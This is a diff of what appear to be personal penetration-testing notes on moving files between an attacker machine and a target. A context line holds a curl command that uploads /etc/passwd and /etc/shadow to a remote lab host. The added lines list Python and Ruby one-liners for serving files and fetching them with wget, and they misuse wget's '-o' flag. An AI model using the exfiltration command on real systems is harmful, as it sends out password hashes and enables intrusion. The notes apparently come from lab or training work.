@@ -32,3 +32,24 @@ Step 1) openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -n
 Step 2) sudo python3 -m uploadserver 443 --server-certificate ~/server.pem :- Start the upload server 
 Step 3) We can run the below command in the server from where the files has to be transfered. 
         curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure {# we can send multiple files}
+
+
+=======================================================================================================================================================================================
+
+
+NOW THIS IS THE BEST WAY TO TRANSFER THE FILE 
+
+Option 1) When we have Python3 
+    pythnon3 -m http.server 80 :- On the server from where the file has to transfered
+    wget http://<IP:Port/File name> -o <Output file path with name>
+
+
+Option 2) If the server doesn't have PYHTON3 
+    python2.7 -m SimpleHTTPServer 80
+    wget http://<IP:Port/File name> -o <Output file path with name>
+
+Option 3) If we don't have PYTHON, we can run Ruby server to transfer the file 
+    ruby -run -ehttpd . -p80
+    wget http://<IP:Port/File name> -o <Output file path with name>
+
+ 
